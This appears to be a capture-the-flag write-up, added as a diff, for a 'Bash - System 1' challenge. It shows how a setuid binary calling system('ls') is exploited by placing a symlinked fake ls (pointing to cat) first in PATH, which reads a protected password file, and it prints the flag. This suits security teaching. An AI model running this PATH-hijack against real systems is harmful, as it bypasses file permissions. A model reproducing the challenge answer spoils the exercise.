@@ -1,0 +1,75 @@
+---
+tags: []
+---
+# Bash - System 1
+
+- **Description:** Find your path, padawan!
+- **Difficulty:** Very easy
+
+---
+
+## 🔎 Solution
+Upon connecting to the target machine, we are presented with a list of files in the current directory:
+```js
+app-script-ch11@challenge02:~$ ls -la
+total 36
+dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 .
+drwxr-xr-x 25 root                    root            4096 Sep  5  2023 ..
+//highlight-start
+-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
+-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
+//highlight-end
+-rw-r-----  1 root                    root              43 Dec 10  2021 .git
+-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
+//highlight-next-line
+-r--------  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
+-r--------  1 root                    root             775 Dec 10  2021 ._perms
+```
+Our goal is to read the contents of the `.passwd` file in order to retrieve the flag. 
+However, direct access is restricted:
+```
+app-script-ch11@challenge02:~$ cat .passwd 
+cat: .passwd: Permission denied
+```
+
+Looking into the source code, we observe that when the binary `ch11` is executed, it internally runs the command `ls /challenge/app-script/ch11/.passwd`. 
+```c
+int main(void)
+{
+    setreuid(geteuid(), geteuid());
+    system("ls /challenge/app-script/ch11/.passwd");
+    return 0;
+}
+```
+
+Since we have execute permission on ch11, we can use this behavior to our advantage:
+```
+app-script-ch11@challenge02:~$ ./ch11 
+/challenge/app-script/ch11/.passwd
+```
+
+There are multiple possible approaches from here, but we'll go with **a symbolic link** (symlink) attack by exploiting how the system("`ls ...`") call works.
+
+Key observations:
+- The `system()` function does not invoke `/bin/ls` directly.
+- Instead, it spawns a shell (`/bin/sh`) which resolves ls using the **PATH** environment variable.
+- If we override the **PATH** variable to point to *a fake ls* (which is actually a symlink to *cat*), we can trick the program into executing *cat* instead of *ls*.
+
+Here's how to do it:
+1. Create a fake directory:
+```
+mkdir /tmp/fake
+```
+2. Create a symbolic link from `ls` to `cat`:
+```
+ln -s /bin/cat /tmp/fake/ls
+```
+3. Run the vulnerable binary with the modified PATH:
+```
+app-script-ch11@challenge02:~$ PATH=/tmp/fake:$PATH ./ch11
+!oPe96a/.s8d5
+```
+And just like that, the contents of `.passwd` are revealed, giving us the flag.
+
+## 🚩Flag
+> `!oPe96a/.s8d5`
